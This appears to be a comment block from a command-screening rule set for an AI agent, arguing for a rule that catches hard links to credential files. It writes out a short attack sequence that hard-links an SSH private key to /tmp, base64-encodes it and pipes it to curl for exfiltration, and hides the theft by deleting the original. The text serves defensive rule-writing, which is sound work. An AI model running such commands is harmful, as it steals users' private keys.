  #   ln ~/.ssh/id_rsa /tmp/data.txt       # silent copy at inode level
  #   cat /tmp/data.txt | base64 | curl ... # exfiltrate "normal-looking" file
  #   rm ~/.ssh/id_rsa                      # victim thinks key is deleted
  #   cat /tmp/data.txt                     # attacker still has the key!
  #
  # This is distinct from `cp` because:
  #   - No data is copied (instant, no disk I/O)
  #   - Changes to the original are reflected in the hard link and vice versa
  #   - The file cannot be truly deleted without finding all hard links
  #
  # Existing rule ts-block-symlink-credential-files only catches `ln -s`.
  # Hard links require a separate rule matching `ln` WITHOUT the `-s` flag.
  #
  # Taxonomy: credential-exposure/file-access/hardlink-credential
  # OWASP LLM06 (Excessive Agency)
  # MITRE T1547.009 — Boot or Logon Autostart Execution: Shortcut Modification
